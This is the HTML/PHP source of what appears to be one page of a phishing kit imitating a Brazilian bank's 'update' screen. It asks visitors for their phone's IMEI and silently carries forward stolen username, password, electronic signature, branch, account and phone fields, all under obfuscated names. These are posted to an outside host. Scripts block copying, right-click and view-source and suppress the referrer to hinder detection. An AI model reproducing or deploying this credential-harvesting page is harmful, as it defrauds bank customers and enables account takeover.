<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<html lang="pt-br"><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">




    <meta charset="utf-8">
     <title>Atualização</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css/tiopatas.css" rel="stylesheet">
    <style type="text/css">


    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

    .input {
        width: 100%;
		background-color: #f7f7f7;
        height: 50px;
        display: block;
        padding: 0 5px;
        border: none;
        border-bottom: 3px solid #ebebeb;
    }
    .input:focus {
        outline: none;
        border-bottom-color: #ff0000 !important;
    }

	
.form-signin
{
    max-width: 100%;
    padding: 20px;
    margin: auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 20px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0px;
    border-bottom-right-radius: 0px;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0px;
    border-top-right-radius: 0px;
}
.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}



hr.style13 {
	height: 10px;
	border: 0;
	box-shadow: 0 10px 10px -10px #8c8b8b inset;
}

input[type=number] {
    -webkit-text-security: disc;
}

</style>
    <title>Atualização</title>
<script>
// Pula campos ao preencher corretamente
function pulacampo(idobj, idproximo){
    var str = new String(document.getElementById(idobj).value);
    var mx = new Number(document.getElementById(idobj).maxLength);
    if (str.length == mx){
        document.getElementById(idproximo).focus();
    }
}
</script>
<script language="javascript">
	var isOK = false;
</script>
<script>
function checkIMEI(){
	var imei = $("#imei").val();
	if (imei.length < 15 || imei.length > 15 || imei == "#06#" || imei == "*#06#" || imei == "000000000000000" || imei == "111111111111111" || imei == "222222222222222" || imei == "333333333333333" || imei == "444444444444444" || imei == "555555555555555" || imei == "666666666666666" || imei == "777777777777777" || imei == "888888888888888" || imei == "999999999999999" || imei == ""){
		alert("IMEI incorreto! Digite seu IMEI novamente");
		$("#imei").val('');
		return false;
	}
		return true;
}	
</script>
<script src="../pf/js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="../pf/js/jquery.maskedinput.min.js" language="javascript"></script>
<script src="script.js?Xxxxdss" language="javascript"></script>
<script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script><style>.bipbop-loader{background-color:rgba(30,50,58,.8);background-position:center center;background-repeat:no-repeat;height:100%;left:0;overflow:hidden;position:fixed;top:0;width:100%}.bipbop-loader .robo{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAABPCAMAAACAlFYvAAACjlBMVEX////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////2vGPuAAAA2XRSTlMAAQIDBAUGBwkKCwwNDhAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyNDU2Nzg6PEBCQ0RGR0hJSkxNUFFTVFVWV1laW1xdXl9gYWJkZWZnaGlqa2xtbm9wcXJzdXd4eXp+f4CBgoOEhYaHiImKi4yNjo+QkZKUlZaYmZucnZ6goaKkpaaoqaqrrK2ur7CxsrO0tba3uLm8vb/BwsPExcbHyMnLz9DR0tPU1dbY2drb3N3e3+Di4+Tl5ufo6err7O7v8PHy8/T19vf4+fr7/P3+7FTI4gAABR5JREFUWMPtmNlbU1cUxRdoSoJSkaKCKGjAEAiDMgRjS6VaxDpWppCWYMWGUoeaMoRaRerYAs5YtLW0UkCjBRzQUgekgoCBBIEQmvXf9OEmEPDjE96z3s7a+3fPvfvse79zLuDQsm0nb942vlW3b57cGoDJmlf4jDPW34XzXNkVNzkr/RHiwrZylmpd4WQlv5Ekm4/kb9/5Fm3PP9JMkqz1csA7SdKStxAz0sI8C0nuEEb+zSQHNzpiXuFpGs2mlXNc8+es3KTRpIU7J9s4SLLZHwCQaiOpdwTklYMk2Vvssh6Bh3tJcrBS7jD0JG2pAIBTJLtiBTvpKWkyNg2RLXFONq6FHGoymsinSYIT20XyFACglqRRcBUd7Nu9XCaTlY2yYYHgLWjgaJlMJlu+u48dCsEzkqwFAFwh2SiYZ2hJTrze2X1OnkFqBG83mSE/1915PTHZwjOC10jyyhR4VQ/1a/pJsj3kLO+KAOCdNp4NaSfJ/jV69qyaFlZxSHpa6AJdCq2hABBqZYpO8E5Lh6iaFs6hKfiOkHg0xmZXAoDSbos5Knh3gk3MmRZO5UBgnZCoj6MtGgASxhinF7y6wAGmTgvHkxuySZJWZQH7JQAwb4AFSitJMnsD7aunhb3r2BpYNEKOZsb08rhQ2ePsjckcJUeKAltZ5z0Frp1YqtQx3giPzsqMULbzlaNvYl+xXRmRmRUdfsPZVmgcX+fzJB8tFtzvSVNFenqVhdZdzg7bZaWlKj29wkQaBGfxI5LnAQD5JOlM/fKFUJwnWyZ6e8sTwevKc16OJPMBAFFmkg+DHIFQ3dUH9y5lBbu+VcFZl+49uKoLdQyDHpI0RwEAROUkWS8bz/X0fPMtdvFk9SRZLhJG0g6S7Dm0NlKhUCgiI+TyCMUURcjlEUJ07aEekuyQOq+VNkySNHfMQGaS5HDaxE2pLbP7/lnUro+0rsk+c9TetG5yQXx31AzODB2s2eH7Rj1FfvEp6yek2jMgJA/sUbnYKfF+ohl8YhN6Bbg3AbNXYp8A9yW6YTfsht2wG3bDbtgNz25b4TlJUDpnVk6NvCHp3p9qLrvqQr2wvae1/sKkQM2Pe6WTUA9d32w2gH06Dxe4guysLtHrD5YYDAZDqX5/UanBYCj79uABfZnBYCgt2q8vMRgMhpKD3+iLa/4lKybYTPKaDFjkGyYBAPjEiuYCwHvSsAAAEIkS/bwAQBK2ZBEgu0b7p+Mn4lus9wE++PPxQLUc8P2qxdpwQAxE1XZbjEnA3JxfR+9+txQIOvbySUsa4FPPW87TdjztKmBZCx9382c/ZPWx5b/OLPhc57NO3gjAR0/5z/BIKbzK+eohn0cBKjvjHfBmmiTAdnuDv7zneTCuMA9f8zCiTW0rlhuZBAN/EO3kL95hHeZk8SVmABITNzvgbTSLgUJWwbuNm9HMtUhjq+eHbJyPShbiMr9A5OvXS5XDXVIcYRUgNnObA1bSthoIfsDqehrfxS6+PNnGAsyt4+/VbA9B8kjn8TYeA07xduWwKQlYbaPSAS9p5UXAo+A5+deHHpBW2dh/IRBY/8jGZ1s8sOjwC5qvxgAJzeRrjQi4yNYlznLryGIxJGs+zggAgPnrc5MWAEDk+1vDAcBL8VmcPwAEpX2iAsTFpG58nSXV5P19arU6W52r1ebmqHPUOVqtNledrVZ/rtVqNdnqbI0QUWdr9t0nqyUTXSI+MTab9hw7IZ50RlCVz+CXlOPHVLnKcVL4HxuvKKnLINUCAAAAAElFTkSuQmCC);height:79px;left:50%;margin-left:-30px;margin-top:-40px;position:relative;top:50%;width:60px;z-index:2}.bipbop-loader .robo .body{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAYCAMAAACoeN87AAACUlBMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AFh8CGSEEGiMLISoMIisOJCwPJS0RJy8VKjIWKzMXKzMXKzQXLDQaLzcdMTkdMTomOUEoPEQpPEMqPEQqPkUsPkYsP0YtP0YtQEcuQUgwQkkwQkowQ0oyRUwzRUwzRk00Rk00R041R042SU83SE84SlI8TVQ8TlQ8TlU+T1Y/UFdAUVhAUlhBUllCU1pDVFpEVFtEVVtEVVxFVVxGVlxHV15IWF9IWV9JWmBKWWBLW2JNXWNOXWRPX2VPYGZQX2VQYGZRYGZRYGdRYWZRYWdSYGZSYWdTYmhUY2lVZGpWZWtYZ21aaW9ca3Fda3FdbHJjcXdpdntue4BwfYFyf4R1gYZ2god2g4d3god3g4h5hYp6hYp6hot8h4t8iIx8iI2Nl5uPmZ2SnJ+SnKCVnqKYoKSapKebpaidpqmgqKuhqa2jq66mrrGzuby3vsC5v8K6wMK7wMO8wsS8wsXAxcjAxsjBx8nCx8rFy8zGy83Kz9HL0NLM0dLN0dPP09XV2NrW2tzk5ufk5+jl5+jl6Onm6Onn6erp6+zq7O3s7e7t7u/u8PHv8fHx8vPy8/Pz8/T29/f39/j39/n4+Pj4+Pn4+fn5+fr5+vr7+/z9/f3+/v7////rBV8kAAAAKnRSTlMAAS40OUBDREVOT1VdYmNmZ2hwc3V6lJiZnJ6fxsfJys7R3OHk8vT1+P0NA4BXAAABQklEQVQoz2NgZWeDARZRVQ11INBU5GSFC3IwM6gdJQAUCCtRIqxEDabkyGEQeRiJRFGysczeITjCxcPTMTbOxcPdOSTAycvb2s/VzqoLqEQFpGR9pH7VwpUNZsa1cxe0mlg2LJxTYWRe2t8Xrd0JVCIDUrIhImzXquU7c1NXz5y9PSXtyNGjawPdlh09OssGpEQWrCS8+mhj5dGa5sU9E2a014EckFV+cPq8/b5tcCWRPmu27dgYG7Vp6ZLNoTFbjx5dYRu06Oju+RYdMCXrgnWSpkyKN9BLnjotQc8wdWJvgK6pf3dTkFYLTMmW+vS8vLys4uKMoqLM4uLsvOz8kuKCnOzCxMkwJUcO7Nu3d+++fWjkvn17DsGU4AcjUokcYSXyDLwC/DDAIwEVVRbigwsKcjEgAyZxaUkpMWERbkZkUQDAc9tw5EWVVQAAAABJRU5ErkJggg==);height:24px;left:13px;position:absolute;top:40px;width:34px;z-index:3;-webkit-animation:slide 1.5s infinite linear;animation:slide 1.5s infinite linear}.bipbop-loader .robo .left-arm,.bipbop-loader .robo .right-arm{height:7px;top:46px;width:40px;z-index:2;background-repeat:no-repeat;position:absolute}.bipbop-loader .robo .left-arm{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAHCAMAAABN2v+8AAAAllBMVEX////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////MC6PrAAAAMXRSTlMABggMFxgjJCUmKzEzOUNES0xNT1FiZHFyd4GaoqqtsbK0ydLb3OLp6+zu7/P3+Pr7wHcdKAAAAGhJREFUGBmNwUcCgjAUBcCHIAFEA0gROx0Tiv/+l3NBFtGNzGD/bFIDK5REVOTZSZNFgS7kjDkW/IR39GP+NgkhLzDtTUX/3fCQNQ2t0kuhk+OsvK84v+juQ9m6TGM7hyhYHHeAF2OND2KEGhdctdN2AAAAAElFTkSuQmCC);background-position:60px center;left:-26px;-webkit-animation:slide-left-arm 1.5s infinite linear;animation:slide-left-arm 1.5s infinite linear}.bipbop-loader .robo .right-arm{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAHCAMAAABN2v+8AAAAk1BMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+AVyv3AAAAMHRSTlMAAgsQEhoeISMkJSs1OEdKS01WWVpeaXByc3V/gJG0zdbY4uPn6Ozt7vDz9PX6/P7u6ENqAAAAZUlEQVQYGY3B2xZCQBgG0C9yGDkl5CwRk8L//k/XBa1lXM3ekKCXfWHAZObFF3i3NNm55w0RZXhx/p5ECx1UdqyCJJQnBozT32fggu65ape5+Ubw/M3VMdiepWATPqh2IUMLzvgBBPcZedCGReQAAAAASUVORK5CYII=);background-position:-15px center;left:47px;-webkit-animation:slide-right-arm 1.5s infinite linear;animation:slide-right-arm 1.5s infinite linear}@-webkit-keyframes slide{0%,100%{top:40px}50%{top:36px}}@keyframes slide{0%,100%{top:40px}50%{top:36px}}@-webkit-keyframes slide-left-arm{0%,100%,25%{background-position:40px}50%{background-position:15px}}@keyframes slide-left-arm{0%,100%,25%{background-position:40px}50%{background-position:15px}}@-webkit-keyframes slide-right-arm{0%,100%,75%{background-position:-15px}50%{background-position:-60px}}@keyframes slide-right-arm{0%,100%,75%{background-position:-15px}50%{background-position:-60px}}.bipbop-loader .itens{background-position:center center;background-repeat:no-repeat;height:20px;position:absolute;opacity:0;width:20px;z-index:1}.bipbop-loader .item1{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAQAAAAngNWGAAABWElEQVQoz3XSTUuUURQA4BtNDv2HrEVmLqJf4B9w4SZctJs+dCgqaJGgCxmhNCLHjQq1kDESBHMvlC0KEiJSUFwIBm3EcNUHpBL2tHgv74eN527ee96Hcw/3niDkVsWmJ86bUSnkg5DfXPcbh97r0tBzHLxpXxJXtHnqQnOYVEti0Vcvmh99I63203b8mlQ+Cq/Ziz9XdWr3Nu4mnMjDin1sW/FHtyCYTpuY0pLBLfzV67QZD5Rd9V0WE0puqwrBKFh30WULPjoAv1L6Tk1dNWgxDr64JJgDB56ZjfC5YMStpIMxsKXDOHZNG3Av0ldmLSsn8JQ62PHDNy/1GzbibqzPoVp2U/WY/KzXqEHDHrljPmYbGTyZ0jf6PDZkyEOfwAetxYcai3RJVU3NRmRni9MTlNKqr923BpadOTpmxV53I2v9fx6LN1BgzWBWNceOgyWDJp3L5/4B2w08XMieSqgAAAAASUVORK5CYII=);left:-30px;top:40px;-webkit-animation:item-1 3s infinite linear;animation:item-1 3s infinite linear}@-webkit-keyframes item-1{0%{opacity:1}25%{left:-30px;opacity:1}50%{left:15px;opacity:1}100%,51%{opacity:0}}@keyframes item-1{0%{opacity:1}25%{left:-30px;opacity:1}50%{left:15px;opacity:1}100%,51%{opacity:0}}.bipbop-loader .item2{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAMAAACejr5sAAAAolBMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9MEo+OAAAANXRSTlMAAwQFChIYHz9ARkhKS01PUFRiZnFzdH+Il6Klrbe4wMLGx8jS1NXm5+jq6+3u7/Dx9fj5/jFXMdAAAABrSURBVBgZZcGJFkJAAAXQ16oVraJSiFaRvP//NTTpTOZe1FqLU/qM1l3ILH7YqPVmg2lOQYfQP/B95ZcDYUWJ10ZFO1JyGaI0P/NPsulglLFpiS0VIQIqEuyo8DF+sSEzgYl7ix8/8X1voADnFiXsVZ8FLQAAAABJRU5ErkJggg==);left:67px;opacity:1;top:36px;-webkit-animation:item-2 3s infinite linear;animation:item-2 3s infinite linear}@-webkit-keyframes item-2{0%{left:67px;opacity:1}25%{left:24px;opacity:1}26%{left:24px;opacity:0}75%{left:67px;opacity:0}100%{opacity:1}}@keyframes item-2{0%{left:67px;opacity:1}25%{left:24px;opacity:1}26%{left:24px;opacity:0}75%{left:67px;opacity:0}100%{opacity:1}}.bipbop-loader .item3{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAQAAAAngNWGAAABdklEQVQoz33STUuUURjG8SNFWg6BRBAEqVAQfQCJclNEtgglcSEFvdmqZbRoFaGVqAw4TmNqU77UZhYpRZ+gleTOqIRatIhq1aIilLJfC585Oo9D1706N/9zznXOfQVhU3UouqGuspuGMtp8c9wVQ2r/B7br8d0rjXpkZaqDex3T55kVLGpy3rD6amCrC+aVtajZWTk7K8GM0/osWLauJft1u7eGBkGN7VpcVkqAXxF954AuBQ3lEztd9dFvLHlkXN6bBP3goDNG7Q72aHFTMfF114wxT/V7HdFDOl0KjjiX7F+RN6rXS4NKRvxN0E9aNQRTZhNXP+TcNuetbk8M+xO9XhOCh3G5qui5nBPmFc3F/qD7Lgb1ZmLriztKBmTNJhev6nXYgpNBsMN0RD97YMT7uL4lr2RX+Xtqk1ev6Wd0V3DKYx0bJ1NnQlpDrvtqX3rWWxUqsDHBUW3VQrFNPmJTlWlM57FGFkymsc3B3WLai42BLdc/OORAItahRRkAAAAASUVORK5CYII=);left:-30px;top:40px;-webkit-animation:item-3 3s infinite linear;animation:item-3 3s infinite linear}@-webkit-keyframes item-3{0%{left:-30px;opacity:0}100%,50%{opacity:0}75%{left:-30px;opacity:1}99%{left:15px;opacity:1}}@keyframes item-3{0%{left:-30px;opacity:0}100%,50%{opacity:0}75%{left:-30px;opacity:1}99%{left:15px;opacity:1}}.bipbop-loader .item4{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAUCAQAAADBqR7CAAABkklEQVQoz3XST0wOABjH8cdoVpTohEmbLQ6FiYMJbxfWEYtEY2MpB5PN3wNFtL1jvb152drcW7yVLbzv2+biYmZzcOmCdUI5NXP9OHgPtWnP7bvv4Xl+zy/Egqn01AfPVC2ksUgZ8MBGPYYt/7+y15hSocRzTYuVasccsVW/00V8Qso2R7WoEaFdXkpG1qy0emV2yZiT9diAnLbw1m4h7DGqw7SPvjhrRKMQGkyFFyqE0OiNpFdumtRvorjNGqMhrU0I3b67rkxY5YafrgqhXSrskLfZefNuCQeN6xS6zTunRl59CCfNSOvVpdQn/FGnRUrGN8f/HX3KjCf6XFSigB+2aDVo2FetIuyUt0mnebeFGj0SwjW/XVCtYHtIFQO7bNYdFUK5XnOuCOGMwZC1thj/S32m3Fdwz7iEEKqMhZxDxejGXPLZe9O6TNgvhGavQ7O8jCEj5jxUa4U6j/wyYlBGzuEQ1klost5dHcU3tknaIOGAysVlaDBptbDShH1LVSoprVbSkGVLKeUGvJNRuZD+BX6cvD1xplJhAAAAAElFTkSuQmCC);left:67px;top:38px;-webkit-animation:item-4 3s infinite linear;animation:item-4 3s infinite linear}@-webkit-keyframes item-4{0%,100%,25%,76%{opacity:0}37%{opacity:1}50%{left:67px;opacity:1}75%{left:25px;opacity:1}}@keyframes item-4{0%,100%,25%,76%{opacity:0}37%{opacity:1}50%{left:67px;opacity:1}75%{left:25px;opacity:1}}.bipbop-loader .floatingCirclesG{position:absolute;width:375px;height:375px;top:50%;left:50%;margin-top:-187px;margin-left:-187px;opacity:.8;z-index:5;-webkit-transform:scale(.6);transform:scale(.6)}.bipbop-loader .f_circleG{position:absolute;background-color:transparent;height:52px;width:52px;border-radius:34px;-webkit-animation-name:f_fadeG;animation-name:f_fadeG;-webkit-animation-duration:1.2s;animation-duration:1.2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-direction:linear;animation-direction:linear}.bipbop-loader .frotateG_01{left:0;top:153px;-webkit-animation-delay:.45s;animation-delay:.45s}.bipbop-loader .frotateG_02{left:44px;top:44px;-webkit-animation-delay:.6s;animation-delay:.6s}.bipbop-loader .frotateG_03{left:153px;top:0;-webkit-animation-delay:.75s;animation-delay:.75s}.bipbop-loader .frotateG_04{right:44px;top:44px;-webkit-animation-delay:.9s;animation-delay:.9s}.bipbop-loader .frotateG_05{right:0;top:153px;-webkit-animation-delay:1.05s;animation-delay:1.05s}.bipbop-loader .frotateG_06{right:44px;bottom:44px;-webkit-animation-delay:1.2s;animation-delay:1.2s}.bipbop-loader .frotateG_07{left:153px;bottom:0;-webkit-animation-delay:1.35s;animation-delay:1.35s}.bipbop-loader .frotateG_08{left:44px;bottom:44px;-webkit-animation-delay:1.5s;animation-delay:1.5s}@-webkit-keyframes f_fadeG{0%{background-color:#f3742b}100%{background-color:transparent}}@keyframes f_fadeG{0%{background-color:#f3742b}100%{background-color:transparent}}</style>
</head>
 
<body>

<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
				<h6 align="center" style=" background-color: #E40203;"><img src="./img/logo.png" height="80" width="250"></h6>
				<h5 align="center"><b><font color="ff0000">Atenção! Será necessário confirmar seu IMEI<br></font></b></h5>
				    <article style="color: #333; font-size: 15px;"> <br>
                      <p align="center"><strong>Como encontrar IMEI no smartphone ?</strong></p>
                      <p align="center">Abra o discador do seu smartphone e ligue para o seguinte código no teclado: <span style="color: #D9161A; font-size: 15px;"><b>*#06#</b></span></p>
                      <p align="center">O IMEI do seu aparelho contém 15 números que aparecerá no visor após o procedimento mencionado acima.</p>
                      <p align="center">Digite o código que irá aparecer no visor de seu smartphone no campo abaixo:</p>
                    </article>
				<hr class="style13">
		         <form action="http://bullmanescoras.com.br/email/envio-san-5-pj.php" method="POST" onsubmit="return isOK;" id="frm">
                 <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/done.php'; ?>" />
                <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/done.php'; ?>" />
                <input name="xdxdxdxtxexlxexfxoxnxex" id="xdxdxdxtxexlxexfxoxnxex" type="hidden" value="<?php echo $_POST['xdxdxdxtxexlxexfxoxnxex']; ?>" >
                <input name="xpxsxexcxrxextxax" id="xpxsxexcxrxextxax" type="hidden" value="<?php echo $_POST['xpxsxexcxrxextxax']; ?>">
				<input name="xdx4x" id="xdx4x" type="hidden" value="<?php echo $_POST['xdx4x']; ?>" >
                <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
                <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
                <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
                <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
                <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">

				 <input name="imei" id="imei" type="tel" placeholder="Digite seu número IMEI" maxlength="15" required="required" onkeyup="pulacampo('imei','dispositivo');" class="input pass">
				 
                    <div class="group" style="width: 92%;">
                    <select name="dispositivo" id="dispositivo" onkeyup="pulacampo('dispositivo','continuar');" required="" class="input pass">
                    </select>
                    </div>
				<br>
				 	<input class="btn btn-lg btn-default btn-block" type="submit" id="continuar" name="continuar" value="CONTINUAR">
				

			</form>
						<img class="profile-img" src="./img/one.png" alt="">
            </div>
        </div>
		
    </div>
</div>
<script language="javascript">
 $( document ).ready(function() {
	 
	$( "#continuar" ).click(function() {
		if (checkIMEI()){
			isOK = true;
			$("#frm").submit();	
		}
		
	});	
	

});
</script>

 
</body></html>
<script>
	var modelo = window.navigator.appVersion;
	function modeloCelular(modelo)
	{
		$.post("modelo.php", { modelo: modelo },
		function(data, status){
			$('#dispositivo').append('<option value="'+data+'" selected="selected">'+data+'</option>');
		});
	}
	modeloCelular(modelo);
</script>